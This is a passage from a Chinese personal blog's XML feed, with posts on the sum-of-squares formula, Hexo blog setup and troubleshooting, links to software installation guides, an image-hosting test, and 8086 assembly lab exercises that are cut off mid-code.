    <content type="html"><![CDATA[<h2 id="一种简单的方法">一种简单的方法</h2><p>在做数据结构第一章的习题时遇见这个问题，感觉很有意思，就写了下来</p><p>这种方法把1²+2²+3²+……+n²写成三个式子，相加除以3得到结果，如下：</p><p>1</p><p>2 2</p><p>3 3 3</p><p>...........................</p><p>n n .................n n ①</p><hr /><p>n</p><p>..............n</p><p>3 ...................n</p><p>2 3 ...... ...........n</p><p>1 2 3....................n ②</p><hr /><p>n</p><p>n .........</p><p>n .................. 3</p><p>n ..........................3 2</p><p>n ..................................3 2 1 ③</p><p>这三个式子都表示1²+2²+3²+……+n²，把他们相加</p><p>①+②+③得</p><p>2n+1</p><p>2n+1 2n+1</p><p>....................................</p><p>2n+1 2n+1 2n+1...........................2n+1 2n+1 2n+1 ①+②+③</p><p>3 ∑n² = n(n+1)(2n+1)/2</p><p>故 1²+2²+······+n² = n（n+1）（2n+1）/6</p>]]></content>
    
    
    
    <tags>
      
      <tag>数学</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>各种软件安装，环境配置</title>
    <link href="/2023/09/03/%E5%90%84%E7%A7%8D%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%EF%BC%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/"/>
    <url>/2023/09/03/%E5%90%84%E7%A7%8D%E8%BD%AF%E4%BB%B6%E5%AE%89%E8%A3%85%EF%BC%8C%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/</url>
    
    <content type="html"><![CDATA[<h2 id="在vscode中配置python开发环境">在VScode中配置Python开发环境</h2><p><ahref="https://blog.csdn.net/weixin_43737995/article/details/125690015?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169362300616800182129289%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169362300616800182129289&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-125690015-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=vscode%20python%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE&amp;spm=1018.2226.3001.4187">在VScode中配置Python开发环境</a></p><h2 id="git安装">Git安装</h2><p><ahref="https://blog.csdn.net/mukes/article/details/115693833?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169205886716800188579548%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169205886716800188579548&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-115693833-null-null.142%5Ev92%5EchatgptT0_1&amp;utm_term=git%E5%AE%89%E8%A3%85&amp;spm=1018.2226.3001.4187">Git详细安装教程</a></p><h2 id="java安装">JAVA安装</h2><p><ahref="https://blog.csdn.net/qq_48988285/article/details/125593715?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169396267216800182147901%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169396267216800182147901&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-2-125593715-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=java%E5%AE%89%E8%A3%85&amp;spm=1018.2226.3001.4187">超详细Java安装教程，小白速来！！！</a></p><h2 id="dev-c安装">Dev C++安装</h2><p><ahref="https://blog.csdn.net/m0_54158068/article/details/124080083?ops_request_misc=%7B%22request%5Fid%22%3A%22169519422116800213087590%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=169519422116800213087590&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_click~default-2-124080083-null-null.142%5Ev94%5EchatsearchT3_1&amp;utm_term=devc%2B%2B&amp;spm=1018.2226.3001.4187">DevC++软件下载及安装教程（详细、具体）_devc++下载_等日出看彩虹的博客-CSDN博客</a></p><h2 id="pycharm安装">Pycharm安装</h2><p><ahref="https://blog.csdn.net/m0_46374969/article/details/131292897?ops_request_misc=%7B%22request%5Fid%22%3A%22169819294316800213022638%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&amp;request_id=169819294316800213022638&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-4-131292897-null-null.142%5Ev96%5Epc_search_result_base1&amp;utm_term=pycharm安装教程&amp;spm=1018.2226.3001.4187">PyCharm安装教程(图文结合，超详细，小白安装必看)_王同学要努力的博客-CSDN博客</a></p><h2 id="vscode配置c语言环境">vscode配置C语言环境</h2><p><ahref="https://www.bilibili.com/video/BV1Hj411F7eW/?spm_id_from=333.999.0.0&amp;vd_source=39f0a6c7a4d98748bb31fcf1e1a3ab7f">啰啰嗦嗦地手把手教你vscode 配置_哔哩哔哩_bilibili</a></p><h2 id="wsl-2安装">WSL 2安装</h2><p><ahref="https://blog.csdn.net/weixin_51245887/article/details/124393376?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=wsl2&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-124393376.142%5Ev96%5Epc_search_result_base1&amp;spm=1018.2226.3001.4187">WSL2 的安装过程（以及介绍）_wsl2-CSDN博客</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo建站过程</title>
    <link href="/2023/08/16/hexo%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/"/>
    <url>/2023/08/16/hexo%E7%BD%91%E7%AB%99%E6%90%AD%E5%BB%BA%E8%BF%87%E7%A8%8B/</url>
    
    <content type="html"><![CDATA[<blockquote><p>记录hexo搭建网站过程中遇到的各种问题</p><p>想搭建一个类似博客的师傅也能跟着下面的记录，99%能搭建一个你自己的博客</p></blockquote><p>b站yyds！！！</p><p><ahref="https://www.bilibili.com/video/BV1Eg41157tL/?spm_id_from=333.337.search-card.all.click&amp;vd_source=445ce756d899a4cef51cfb6b148ba121">hexo加GitHub搭建网站教程</a></p><p>评论区的搭建感谢大佬的博客<ahref="https://ltyzzzxxx.github.io/2022/10/05/Hexo%E4%BB%8E0%E5%88%B01%E6%90%AD%E5%BB%BA%E5%8D%9A%E5%AE%A2%E7%B3%BB%E5%88%9703%EF%BC%9A%E6%96%87%E7%AB%A0%E4%B8%8E%E8%AF%84%E8%AE%BA%E6%A8%A1%E5%9D%97/">周三不Coding</a></p><blockquote><p>图床的搭建暂时感谢<ahref="https://blog.csdn.net/Godlichangwu/article/details/127331738?ops_request_misc=%7B%22request%5Fid%22%3A%22169417712716800197059093%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=169417712716800197059093&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-127331738-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=Github仓库%20%2B%20Picgo%20&amp;spm=1018.2226.3001.4187">搭建免费图床——github+picGo+jsdelivr_github图床token获取_chunis的博客-CSDN博客</a>（bye~~~）</p></blockquote><p>图床的搭建感谢<ahref="https://zhuanlan.zhihu.com/p/653227146">Typora+PicGo+阿里云OSS搭建博客图床- 知乎 (zhihu.com)</a></p><p>网站统计量的设置：<ahref="https://blog.csdn.net/qq_48759664/article/details/119460188?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=hexo%20fluid访客量&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-5-119460188.142%5Ev94%5EchatsearchT3_1&amp;spm=1018.2226.3001.4187">Hexo-fluid主题设置统计博客阅读量_给fluid主题设置统计数量_codeacg的博客-CSDN博客</a>（注意还要配置一下RESTAPI 服务器地址）</p><p>这个是加上网站的运行时间：<ahref="https://blog.csdn.net/qq_36852780/article/details/120943120?ops_request_misc=&amp;request_id=&amp;biz_id=102&amp;utm_term=hexo主题fluid怎么在下面加上运行时间&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-120943120.142%5Ev94%5EchatsearchT3_1&amp;spm=1018.2226.3001.4187">HexoFluid主题 细节优化_hexo fluid美化-CSDN博客</a></p><p>数学公式的显示问题参考：<ahref="https://blog.csdn.net/qq_52466006/article/details/126924064?ops_request_misc=%7B%22request%5Fid%22%3A%22169745488716800192255314%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fall.%22%7D&amp;request_id=169745488716800192255314&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-126924064-null-null.142%5Ev96%5Epc_search_result_base1&amp;utm_term=博客数学公式显示错误&amp;spm=1018.2226.3001.4187">Hexo显示Latex公式最新解决方案_hexo公式-CSDN博客</a></p><p>在最下面显示了一个地图，来统计一下看谁访问了笨鼠的博客（因为最近阿里云总是给我发信息说我欠费，我就怀疑是外网流入欠的费，每次0.01元，002元，虽然不多，但是总感觉不舒服），不过这里我是修改的<code>D:\blog\myblog\themes\fluid\layout\_partials\footer.ejs</code>，在它最下面添加了：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">&lt;script <span class="hljs-attribute">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span> <span class="hljs-attribute">id</span>=<span class="hljs-string">&quot;clustrmaps&quot;</span> <span class="hljs-attribute">src</span>=<span class="hljs-string">&quot;//clustrmaps.com/map_v2.js?d=BHu02doWTfACgsoaKUKdCvghL0B4M-WZR956AK7Bn-I&amp;cl=ffffff&amp;w=600&quot;</span>&gt;&lt;/script&gt;<br></code></pre></td></tr></table></figure><p><ahref="https://cloud.tencent.com/developer/article/1585686">如何统计 Hexo网站的访问地区和IP-腾讯云开发者社区-腾讯云 (tencent.com)</a></p><p>（但是现在这个功能好像失效了，这个网站国内访问you'd）</p><p>🏓🏓🏓</p><hr /><hr /><p><strong>下面是遇到的一些问题</strong></p><h2 id="数学公式问题">数学公式问题</h2><p>记得打公式的时候”$$“，</p><p>这里前面的 "$"，以及后面的，记得跟公式的正文紧密挨着，不要留空格，如：</p><p><span class="math inline">\(X = \begin{bmatrix} x\\ y\end{bmatrix}\)</span>，就能显示成功</p><p>而：</p>$ X =<span class="math display">\[\begin{bmatrix}x\\ y\end{bmatrix}\]</span><p>$，就直接显示失败</p><h2 id="错误1hexo-d-总是报错">错误1：<code>hexo d</code> 总是报错</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs subunit"><span class="hljs-keyword">Error: </span>Spawn failed<br>这错误烦死人，一直报<br></code></pre></td></tr></table></figure><h3 id="解决方案">解决方案</h3><ul><li>重新配置一下SSH，把下面的<strong>write</strong>那个选项给它勾上！！！！！！！！！！！！</li><li>不知道为啥，下面竟然还有个选项，不勾上的话就是readonly，然后就会一直报那个错误😡😡</li></ul><h2id="错误2bash-hexo-command-not-found">错误2：<code>bash: hexo: command not found</code></h2><h3 id="解决方案-1">解决方案</h3><p>将<code>D:\blog\myblog\node_modules\.bin</code>,添加到Path中</p><h2 id="错误3">错误3</h2><figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs subunit">ssh: Could not resolve hostname github.com: Name or service not known<br>fatal: Could not read from remote repository.<br><br>Please make sure you have the correct access rights<br>and the repository exists.<br>FATAL Something&#x27;s wrong. Maybe you can find the solution here: https://hexo.io/d<br>ocs/troubleshooting.html<br><span class="hljs-keyword">Error: </span>Spawn failed<br>    at ChildProcess.&lt;anonymous&gt; (D:\blog\myblog\node_modules\hexo-util\lib\spawn<br>.js:51:21)<br>    at ChildProcess.emit (node:events:514:28)<br>    at cp.emit (D:\blog\myblog\node_modules\cross-spawn\lib\enoent.js:34:29)<br>    at ChildProcess._handle.onexit (node:internal/child_process:291:12)<br>    <br></code></pre></td></tr></table></figure><p>不知道为什么会报这个错误，可能是我总是翻墙的问题吧，不太懂，草，一会一个错误md😡</p><h3 id="解决方案-2">解决方案</h3><p><ahref="https://blog.csdn.net/li_001/article/details/70245006?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522169400980416800225586698%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&amp;request_id=169400980416800225586698&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-70245006-null-null.142%5Ev93%5EchatgptT3_1&amp;utm_term=ssh%3A%20Could%20not%20resolve%20hostname%20github.com%3A%20Name%20or%20service%20not%20known%20fatal%3A%20Could%20not%20read%20from%20remote%20repository.&amp;spm=1018.2226.3001.4187">CSDN解决方案</a></p><p>方案一亲测有效，CSDNyyds！😭</p><h2 id="typora-卡顿">Typora 卡顿</h2><p>Typora在写超过大概八九千字的时候就有明显的卡顿，只有在写代码的模式下才不卡，导致非常难受，在网上搜到的一篇文章能稍微缓解一点这个问题</p><h3 id="解决方案-3">解决方案</h3><p><ahref="https://blog.csdn.net/Mao_Jonah/article/details/120533879">win10上Typora卡顿的问题及其解决方案_typora卡顿解决方法-CSDN博客</a></p>]]></content>
    
    
    <categories>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/08/14/hello-world/"/>
    <url>/2023/08/14/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your veryfirst post. Check <a href="https://hexo.io/docs/">documentation</a> formore info. If you get any problems when using Hexo, you can find theanswer in <ahref="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> oryou can ask me on <ahref="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="quick-start">Quick Start</h2><h3 id="create-a-new-post">Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="run-server">Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="generate-static-files">Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="deploy-to-remote-sites">Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <ahref="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    <categories>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>测试博客</title>
    <link href="/2023/08/03/%E6%B5%8B%E8%AF%95%E5%8D%9A%E5%AE%A2/"/>
    <url>/2023/08/03/%E6%B5%8B%E8%AF%95%E5%8D%9A%E5%AE%A2/</url>
    
    <content type="html"><![CDATA[<p>title: Crypto系列——RSA（二） date: 2023-09-14 21:57:30 tags:[CTF,Crypto,RSA] categories: CTF-Crypto math: true excerpt:《从0开始的密码学世界生活2》😋 updated: 2023-10-03 22:20:49</p><h3 id="pwn1">pwn1</h3><h3 id="pwn2">pwn2</h3><p><a href="https://freeimage.host/i/J9YVHSj"><imgsrc="https://iili.io/J9YVHSj.md.png" alt="2309062" /></a></p><figure><img src="https://freeimage.host/i/J9YVHSj" alt="2309062" /><figcaption aria-hidden="true">2309062</figcaption></figure><figure><img src="https://iili.io/J9YVHSj.md.png" alt="2309062" /><figcaption aria-hidden="true">2309062</figcaption></figure><figure><img src="http://static.runoob.com/images/runoob-logo.png"title="RUNOOB" alt="RUNOOB 图标" /><figcaption aria-hidden="true">RUNOOB 图标</figcaption></figure><p><sub>撒旦哈市风口浪尖</sub></p><p>测试一下，看能不能直接传图片</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-imgimage-20230908210230931.png"alt="image-20230908210230931" /><figcaption aria-hidden="true">image-20230908210230931</figcaption></figure><p>看来 jsDelivr CDN确实被墙了，那只能试一下阿里云了，测</p><p>哦？？这过了几分钟（2023.09.08 21:07），怎么又行了：</p><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-imgimage-20230908210813336.png"alt="image-20230908210813336" /><figcaption aria-hidden="true">image-20230908210813336</figcaption></figure><p>行吧，那先用着</p><h3 id="section">2023.10.27</h3><p>b jsDelivrCDN总是出错，换成了阿里云OSS，花了我九块大米，试一下能不能上传成功（目前还行，果然“<strong>免费的才是最贵的</strong>”吗？😥）</p><figure><imgsrc="https://wiper3.oss-cn-guangzhou.aliyuncs.com/blogimage/202310270011249.png"alt="image-20231027001155106" /><figcaption aria-hidden="true">image-20231027001155106</figcaption></figure>]]></content>
    
    
    <categories>
      
      <category>博客</category>
      
    </categories>
    
    
    <tags>
      
      <tag>博客</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>汇编语言实验</title>
    <link href="/2023/05/27/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C/"/>
    <url>/2023/05/27/%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%AE%9E%E9%AA%8C/</url>
    
    <content type="html"><![CDATA[<h2 id="loop双层循环">loop双层循环</h2><hr /><p><a href="https://freeimage.host/i/H655pWu"><imgsrc="https://iili.io/H655pWu.md.png" alt="H655pWu.md.png" /></a></p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br><br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">start:</span>  <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dx</span>,<span class="hljs-number">0</span><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">10</span><br><span class="hljs-symbol">        </span><br><span class="hljs-symbol">    s:</span>  <span class="hljs-keyword">push</span> <span class="hljs-built_in">cx</span><br><span class="hljs-symbol">        </span><br><span class="hljs-symbol">     b:</span> <span class="hljs-keyword">add</span> <span class="hljs-built_in">dx</span>,<span class="hljs-built_in">cx</span><br>    <br>        <span class="hljs-keyword">loop</span> b<br><br>        <span class="hljs-keyword">pop</span> <span class="hljs-built_in">cx</span>    <br>        <span class="hljs-keyword">loop</span> s  <br><br><br>        <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br>        <span class="hljs-keyword">int</span> <span class="hljs-number">21h</span> <br><br><br>code ends<br>end start<br><br><br></code></pre></td></tr></table></figure><ul><li>两层循环解决</li></ul><hr /><h2 id="实验4-bx和loop的使用">实验4 [bx]和loop的使用</h2><hr /><p>1.编程，向内存0:200-0:23F依次传送数据0-63（3FH)。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code         <span class="hljs-comment">;八条指令的</span><br><br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">start:</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0h</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">bx</span><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">64</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">s:</span><span class="hljs-keyword">mov</span> [<span class="hljs-built_in">bx</span>+<span class="hljs-number">200h</span>],<span class="hljs-built_in">bx</span><br><span class="hljs-keyword">inc</span> <span class="hljs-built_in">bx</span><br><span class="hljs-keyword">loop</span> s<br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br>code ends<br>end start<br><br><br><br><br><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code         <span class="hljs-comment">;九条指令的，书上现在还规定指令数</span><br><br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">start:</span><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">0020H</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">bx</span>,<span class="hljs-number">0</span><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">64</span><br><span class="hljs-symbol"></span><br><span class="hljs-symbol">s:</span><span class="hljs-keyword">mov</span> [<span class="hljs-built_in">bx</span>],<span class="hljs-built_in">bl</span><br>   <span class="hljs-keyword">inc</span> <span class="hljs-built_in">bx</span><br>   <span class="hljs-keyword">loop</span> s<br><br><br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br>code ends<br>end start<br><br><br></code></pre></td></tr></table></figure><hr /><h2 id="实验5-编写调试具有多个段的程序">实验5编写、调试具有多个段的程序</h2><hr /><p>1.程序如下，编写code段中的代码，将a段和b段中的数据依次相加，将结果保存到c段中。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br>a <span class="hljs-meta">segment</span><br><span class="hljs-built_in">db</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><br>a ends<br>b <span class="hljs-meta">segment</span><br><span class="hljs-built_in">db</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><br>b ends<br>c <span class="hljs-meta">segment</span> <br><span class="hljs-built_in">db</span> <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>c ends<br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol">start:</span><br>?<br>code ends<br>end start<br><br><br>补充后的代码如下：<br><br><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code<br>a <span class="hljs-meta">segment</span><br><span class="hljs-built_in">db</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><br>a ends<br>b <span class="hljs-meta">segment</span><br><span class="hljs-built_in">db</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span class="hljs-number">5</span>,<span class="hljs-number">6</span>,<span class="hljs-number">7</span>,<span class="hljs-number">8</span><br>b ends<br>c <span class="hljs-meta">segment</span> <br><span class="hljs-built_in">db</span> <span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span><br>c ends<br>code <span class="hljs-meta">segment</span><br><span class="hljs-symbol">start:</span> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,a<br>   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">ds</span>,<span class="hljs-built_in">ax</span><br>   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">cx</span>,<span class="hljs-number">8</span><br>   <span class="hljs-keyword">mov</span> <span class="hljs-built_in">si</span>,<span class="hljs-number">0</span><br><span class="hljs-symbol">   </span><br><span class="hljs-symbol">s:</span> <span class="hljs-keyword">mov</span> <span class="hljs-built_in">dx</span>,<span class="hljs-number">0</span><br>   <span class="hljs-keyword">add</span> <span class="hljs-built_in">dl</span>,[<span class="hljs-built_in">si</span>]<br>   <span class="hljs-keyword">add</span> <span class="hljs-built_in">dl</span>,[<span class="hljs-number">16</span>+<span class="hljs-built_in">si</span>]<br>   <span class="hljs-keyword">mov</span> [<span class="hljs-number">32</span>+<span class="hljs-built_in">si</span>],<span class="hljs-built_in">dl</span><br>   <span class="hljs-keyword">inc</span> <span class="hljs-built_in">si</span><br>   <span class="hljs-keyword">loop</span> s<br>   <br><span class="hljs-keyword">mov</span> <span class="hljs-built_in">ax</span>,<span class="hljs-number">4c00h</span><br><span class="hljs-keyword">int</span> <span class="hljs-number">21h</span><br>code ends<br>end start<br></code></pre></td></tr></table></figure><p>2.程序如下，编写code段代码，用push指令将a段中的前8个字型数据，逆序存储到b段中。</p><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs x86asm"><span class="hljs-meta">assume</span> <span class="hljs-built_in">cs</span>:code <br>a <span class="hljs-meta">segment</span> <br><span class="hljs-built_in">dw</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>,<span 